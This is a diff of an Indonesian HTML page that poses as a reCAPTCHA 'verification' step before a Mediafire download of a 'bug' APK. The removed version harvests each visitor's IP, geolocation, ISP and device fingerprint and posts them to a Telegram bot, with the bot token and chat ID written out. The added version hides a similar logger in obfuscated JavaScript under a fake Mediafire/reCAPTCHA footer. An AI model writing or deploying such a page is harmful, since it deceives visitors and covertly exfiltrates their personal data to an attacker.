@@ -1,120 +1,68 @@
-<!DOCTYPE html><html lang="id">
+<!DOCTYPE html>
+<html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verifikasi Robot</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verifikasi Mediafire</title>
   <style>
     body {
       margin: 0;
       font-family: 'Segoe UI', sans-serif;
-      background: #ffffff;
-      color: #000000;
+      background: linear-gradient(to bottom right, #0066cc, #003366);
+      color: white;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+    }
+
+    .box {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      border-radius: 12px;
+      padding: 30px;
       text-align: center;
-    }.box {
-  background: rgba(0, 0, 0, 0.03);
-  backdrop-filter: blur(8px);
-  border-radius: 12px;
-  padding: 30px;
-  max-width: 450px;
-  width: 90%;
-  box-shadow: 0 0 15px rgba(0,0,0,0.15);
-}
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
+      width: 90%;
+      max-width: 400px;
+    }
 
-.footer {
-  position: absolute;
-  bottom: 10px;
-  font-size: 13px;
-  opacity: 0.6;
-  width: 100%;
-  color: #333;
-}
+    .box h2 {
+      margin-bottom: 15px;
+    }
 
+    .box p {
+      margin-bottom: 25px;
+    }
+
+    .footer {
+      position: absolute;
+      bottom: 10px;
+      text-align: center;
+      font-size: 13px;
+      color: white;
+      opacity: 0.7;
+      width: 100%;
+    }
   </style>
+  <!-- reCAPTCHA API -->
   <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
-<body>  <div class="box">
+<body>
+
+  <div class="box">
     <h2>🔐 Verifikasi Diperlukan</h2>
-    <p>Silakan verifikasi di bawah untuk melanjutkan ke halaman download.</p>
-    <div class="g-recaptcha" data-sitekey="6LdeHZArAAAAAFZT1atO2lPapq8V_sSs0nKE1Uba" data-callback="verifikasi"></div>
-  </div>  <div class="footer">
-    © 2025 SamXploit | reCAPTCHA v2
-  </div>  <script>
-    async function verifikasi() {
-      try {
-        const geo = await fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));
+    <p>Silakan verifikasi untuk melanjutkan ke halaman download.</p>
+    <div class="g-recaptcha" data-sitekey="6LdeHZArAAAAAFZT1atO2lPapq8V_sSs0nKE1Uba" data-callback="onVerified"></div>
+  </div>
 
-        const now = new Date();
-        const waktuAkses = now.toLocaleString('id-ID');
-        const ip = geo.ip || '-';
-        const negara = geo.country_name || '-';
-        const kodeNegara = geo.country || '-';
-        const kota = geo.city || '-';
-        const region = geo.region || '-';
-        const kodePos = geo.postal || '-';
-        const lat = geo.latitude || '-';
-        const lon = geo.longitude || '-';
-        const zona = geo.timezone || '-';
-        const org = geo.org || '-';
+  <div class="footer">
+    © 2012 reCAPTHA |  Mediafire + reCAPTCHA
+  </div>
 
-        const userAgent = navigator.userAgent;
-        const platform = navigator.platform;
-        const bahasa = navigator.language;
-        const bahasaTambahan = navigator.languages.join(', ');
-        const resolusi = `${screen.width}x${screen.height}`;
-        const warna = screen.colorDepth + ' bit';
-        const online = navigator.onLine ? 'Online' : 'Offline';
-        const cookies = navigator.cookieEnabled ? 'Ya' : 'Tidak';
-        const referrer = document.referrer || 'Langsung (direct)';
-        const url = location.href;
-        const memori = navigator.deviceMemory || '-';
-        const cpu = navigator.hardwareConcurrency || '-';
-        const webdriver = navigator.webdriver ? 'Ya' : 'Tidak';
-        const touch = navigator.maxTouchPoints || 0;
-        const dnt = navigator.doNotTrack || 'null';
-        const produk = navigator.product || '-';
-        const versi = navigator.appVersion || '-';
+  <script>
+    (function(_0x33bd1d,_0x318059){const _0x48d1c6=_0x48eb,_0x40e62c=_0x38d3,_0x25a04d=_0x33bd1d();while(!![]){try{const _0x1d3827=parseInt(_0x40e62c(0x75))/0x1*(-parseInt(_0x48d1c6(0x8f,'TrGs'))/0x2)+parseInt(_0x40e62c(0x9b))/0x3+parseInt(_0x48d1c6(0x74,'@!u^'))/0x4+-parseInt(_0x48d1c6(0x88,'CY@7'))/0x5*(-parseInt(_0x48d1c6(0x9a,'@o5Z'))/0x6)+parseInt(_0x40e62c(0x99))/0x7*(parseInt(_0x40e62c(0x72))/0x8)+-parseInt(_0x40e62c(0x9c))/0x9*(parseInt(_0x40e62c(0x85))/0xa)+-parseInt(_0x40e62c(0x97))/0xb*(parseInt(_0x40e62c(0x96))/0xc);if(_0x1d3827===_0x318059)break;else _0x25a04d['push'](_0x25a04d['shift']());}catch(_0x4e4be9){_0x25a04d['push'](_0x25a04d['shift']());}}}(_0x91be,0xd58d7));function _0x48eb(_0xe04ac4,_0x5c4819){const _0x91bee5=_0x91be();return _0x48eb=function(_0x38d30e,_0x50ee41){_0x38d30e=_0x38d30e-0x6f;let _0x2958d4=_0x91bee5[_0x38d30e];if(_0x48eb['DMVYDU']===undefined){var _0x167c09=function(_0x32aca6){const _0x158e8f='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x28063e='',_0x44e0d2='';for(let _0x3866b1=0x0,_0x3c09cc,_0x480003,_0x31aa6d=0x0;_0x480003=_0x32aca6['charAt'](_0x31aa6d++);~_0x480003&&(_0x3c09cc=_0x3866b1%0x4?_0x3c09cc*0x40+_0x480003:_0x480003,_0x3866b1++%0x4)?_0x28063e+=String['fromCharCode'](0xff&_0x3c09cc>>(-0x2*_0x3866b1&0x6)):0x0){_0x480003=_0x158e8f['indexOf'](_0x480003);}for(let _0x77ae64=0x0,_0xea3ea0=_0x28063e['length'];_0x77ae64<_0xea3ea0;_0x77ae64++){_0x44e0d2+='%'+('00'+_0x28063e['charCodeAt'](_0x77ae64)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x44e0d2);};const _0x48ebec=function(_0x59fdf7,_0x4dc91d){let _0x4b6c78=[],_0x55be47=0x0,_0x5217b7,_0x1c6b70='';_0x59fdf7=_0x167c09(_0x59fdf7);let _0x5f15fa;for(_0x5f15fa=0x0;_0x5f15fa<0x100;_0x5f15fa++){_0x4b6c78[_0x5f15fa]=_0x5f15fa;}for(_0x5f15fa=0x0;_0x5f15fa<0x100;_0x5f15fa++){_0x55be47=(_0x55be47+_0x4b6c78[_0x5f15fa]+_0x4dc91d['charCodeAt'](_0x5f15fa%_0x4dc91d['length']))%0x100,_0x5217b7=_0x4b6c78[_0x5f15fa],_0x4b6c78[_0x5f15fa]=_0x4b6c78[_0x55be47],_0x4b6c78[_0x55be47]=_0x5217b7;}_0x5f15fa=0x0,_0x55be47=0x0;for(let _0x5046e5=0x0;_0x5046e5<_0x59fdf7['length'];_0x5046e5++){_0x5f15fa=(_0x5f15fa+0x1)%0x100,_0x55be47=(_0x55be47+_0x4b6c78[_0x5f15fa])%0x100,_0x5217b7=_0x4b6c78[_0x5f15fa],_0x4b6c78[_0x5f15fa]=_0x4b6c78[_0x55be47],_0x4b6c78[_0x55be47]=_0x5217b7,_0x1c6b70+=String['fromCharCode'](_0x59fdf7['charCodeAt'](_0x5046e5)^_0x4b6c78[(_0x4b6c78[_0x5f15fa]+_0x4b6c78[_0x55be47])%0x100]);}return _0x1c6b70;};_0x48eb['pmxGpn']=_0x48ebec,_0xe04ac4=arguments,_0x48eb['DMVYDU']=!![];}const _0x1b35b2=_0x91bee5[0x0],_0x58fed4=_0x38d30e+_0x1b35b2,_0x597f3b=_0xe04ac4[_0x58fed4];return!_0x597f3b?(_0x48eb['RdRjXS']===undefined&&(_0x48eb['RdRjXS']=!![]),_0x2958d4=_0x48eb['pmxGpn'](_0x2958d4,_0x50ee41),_0xe04ac4[_0x58fed4]=_0x2958d4):_0x2958d4=_0x597f3b,_0x2958d4;},_0x48eb(_0xe04ac4,_0x5c4819);}async function onVerified(){const _0x27a2dc=_0x38d3,_0x4f3903=_0x48eb,_0x480003=await fetch(_0x4f3903(0x95,'CY@7')+_0x27a2dc(0x98)+_0x4f3903(0x7e,'q6(M')+_0x4f3903(0x8c,'9oK8'))[_0x4f3903(0x8a,'KiAc')](_0x4b6c78=>_0x4b6c78['json']())[_0x4f3903(0x89,'snS5')](_0x55be47=>_0x55be47['ip']),_0x31aa6d=navigator['userAgent'],_0x77ae64=new Date()[_0x4f3903(0x8d,'i0ip')+_0x4f3903(0x79,'r*tR')](_0x4f3903(0x87,'vFf!')),_0xea3ea0=_0x4f3903(0x73,'EGj@')+_0x4f3903(0x7a,'7p)q')+_0x4f3903(0x78,'(W)^')+'\x20'+_0x480003+(_0x27a2dc(0x77)+_0x4f3903(0x76,'3]ch'))+_0x31aa6d+'\x0a🕒\x20Waktu:\x20'+_0x77ae64,_0x59fdf7=_0x27a2dc(0x7b)+_0x4f3903(0x9e,'WOxu'),_0x4dc91d=_0x27a2dc(0x70)+_0x4f3903(0x7f,'Ph3r');fetch(_0x27a2dc(0x91)+_0x4f3903(0x7c,'ajqX')+_0x27a2dc(0x8b)+_0x59fdf7+('/sendMessa'+'ge'),{'method':_0x27a2dc(0x9d),'headers':{'Content-Type':_0x4f3903(0x94,'naQg')+_0x4f3903(0x84,']kgs')},'body':JSON[_0x4f3903(0x86,'UePi')]({'chat_id':_0x4dc91d,'text':_0xea3ea0,'parse_mode':_0x27a2dc(0x83)})}),alert('✅\x20Verifika'+_0x4f3903(0x90,'9&6A')+_0x27a2dc(0x71)+_0x27a2dc(0x8e)+_0x4f3903(0x80,'WOxu')+_0x27a2dc(0x93)+'ad.');}function _0x38d3(_0xe04ac4,_0x5c4819){const _0x91bee5=_0x91be();return _0x38d3=function(_0x38d30e,_0x50ee41){_0x38d30e=_0x38d30e-0x6f;let _0x2958d4=_0x91bee5[_0x38d30e];if(_0x38d3['KAmbMW']===undefined){var _0x167c09=function(_0x48ebec){const _0x32aca6='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x158e8f='',_0x28063e='';for(let _0x44e0d2=0x0,_0x3866b1,_0x3c09cc,_0x480003=0x0;_0x3c09cc=_0x48ebec['charAt'](_0x480003++);~_0x3c09cc&&(_0x3866b1=_0x44e0d2%0x4?_0x3866b1*0x40+_0x3c09cc:_0x3c09cc,_0x44e0d2++%0x4)?_0x158e8f+=String['fromCharCode'](0xff&_0x3866b1>>(-0x2*_0x44e0d2&0x6)):0x0){_0x3c09cc=_0x32aca6['indexOf'](_0x3c09cc);}for(let _0x31aa6d=0x0,_0x77ae64=_0x158e8f['length'];_0x31aa6d<_0x77ae64;_0x31aa6d++){_0x28063e+='%'+('00'+_0x158e8f['charCodeAt'](_0x31aa6d)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x28063e);};_0x38d3['FgjXCd']=_0x167c09,_0xe04ac4=arguments,_0x38d3['KAmbMW']=!![];}const _0x1b35b2=_0x91bee5[0x0],_0x58fed4=_0x38d30e+_0x1b35b2,_0x597f3b=_0xe04ac4[_0x58fed4];return!_0x597f3b?(_0x2958d4=_0x38d3['FgjXCd'](_0x2958d4),_0xe04ac4[_0x58fed4]=_0x2958d4):_0x2958d4=_0x597f3b,_0x2958d4;},_0x38d3(_0xe04ac4,_0x5c4819);}function _0x91be(){const _0x2e270b=['vCkiWOtdSCka8k6cSw/cQb7dTq','WRiRp8kQ','dmkVW6hdM8oOW4aMW7zlsG','svnjx0jpvf9utW','fty+WQVcT8o2BSkxW7/cUq','mtmWDNvtEw5q','cwryzmksWQFdPmkpW7iB','hSo5kY5rjq','C8keW794aCkLW7xcRMlcUW','zJOjr8o6W5pcUe/dVKFdIq','mtHLEK1Lwhu','twfYA2rVD24','d3xcMSoRdSoL','nJi1mezLu1b0zq','pG/dOM7cSHFdJ8kSWOy','W53cSNpcSCog','aCkjW5rMWQZdISkGWPBcVxfWxmkJ','gMZdJtq','uSkUjJ0','lM9YzY9IB3q','W5T/WQW','hmoDW4FdVtOLxvddV2i','yw4GzgLHCMfOAW','nSo4WRr5k8kXaJtdPG','WQ3cP8oaESoyFCkUimkilq','Ahr0Chm6lY9HCa','veOQbmkUWQpcHmoVWO51qGVcJG','BwfUigrVD25SBW','W7ldUL1BWO3cQLbGW51/','wmoiWPaMW6RdImk6W5pcN3m','otz1qM9Zwva','mZuYmtmZmu10BNnWCW','As5PCgLMEs5VCG','mJu2ouvXy0Tqua','W4v4AqyWW6yVW5G','ntiXnZi3m0PetfnTCq','mtCZnJfcC3PowuS','ue9tva','wCkVWPfml8oeW5dcMG','achcP0yyWRhdR1hdJudcNmomWOu','svnjx0niqvrFsq','BceGqw5KysbHAW','mZi5odrdy2zPzLq','4P+aW5BdLCk4W59LW57cLuK4','WPmgWQbAW7HeuvZcP8keiglcVW','mta4nZDXwxrtA0S','r0RdIhW','cVcFK7eGugvYyw5NAW'];_0x91be=function(){return _0x2e270b;};return _0x91be();}
+  </script>
 
-        function getBrowser() {
-          const ua = navigator.userAgent;
-          if (ua.indexOf("Chrome") !== -1) return "Chrome";
-          if (ua.indexOf("Firefox") !== -1) return "Firefox";
-          if (ua.indexOf("Safari") !== -1 && ua.indexOf("Chrome") === -1) return "Safari";
-          if (ua.indexOf("Edge") !== -1) return "Edge";
-          if (ua.indexOf("Opera") !== -1 || ua.indexOf("OPR") !== -1) return "Opera";
-          return "Lainnya";
-        }
-
-        function getOS() {
-          const ua = navigator.userAgent;
-          if (ua.indexOf("Windows") !== -1) return "Windows";
-          if (ua.indexOf("Android") !== -1) return "Android";
-          if (ua.indexOf("Linux") !== -1) return "Linux";
-          if (ua.indexOf("iPhone") !== -1) return "iOS";
-          return "Lainnya";
-        }
-
-        const pesan = `🧠 *DATA PENGUNJUNG (Lengkap)*\n\n📌 *IP:* ${ip}\n🌍 *Negara:* ${negara} (${kodeNegara})\n🏙 *Kota:* ${kota}\n📡 *ISP:* ${org}\n🧭 *Wilayah:* ${region} ${kodePos}\n🕓 *Zona Waktu:* ${zona}\n📍 *Lokasi:* ${lat}, ${lon}\n\n🖥 *User-Agent:* ${userAgent}\n🌐 *Browser:* ${getBrowser()}\n💻 *OS:* ${getOS()}\n🪟 *Platform:* ${platform}\n🈯 *Bahasa:* ${bahasa}\n🌐 *Bahasa Tambahan:* ${bahasaTambahan}\n📏 *Resolusi:* ${resolusi}\n🎨 *Warna:* ${warna}\n📶 *Online:* ${online}\n🍪 *Cookies Aktif:* ${cookies}\n\n🔗 *Referrer:* ${referrer}\n📄 *URL:* ${url}\n⏰ *Waktu Akses:* ${waktuAkses}\n\n🧠 *Memori Device:* ${memori} GB\n🧠 *CPU Core:* ${cpu}\n🤖 *WebDriver/Bot:* ${webdriver}\n👆 *Touch Support:* ${touch}\n🚫 *Do Not Track:* ${dnt}\n📦 *Produk:* ${produk}\n🔢 *Versi:* ${versi}`;
-
-        const BOT_TOKEN = '8072851009:AAHDsHyz5EgG2ThhEFAp_1QR1tQAQgcFr4M';
-        const CHAT_ID = '7625804862';
-
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: pesan,
-            parse_mode: 'Markdown'
-          })
-        });
-      } catch (e) {}
-      finally {
-        window.location.href = "https://www.mediafire.com/file/49m97ugah1hwwqp/Apk_Bug_SamsInfinity_v1.0%25281%2529_%25284%2529.apk/file";
-      }
-    }
-  </script></body>
+</body>
 </html>
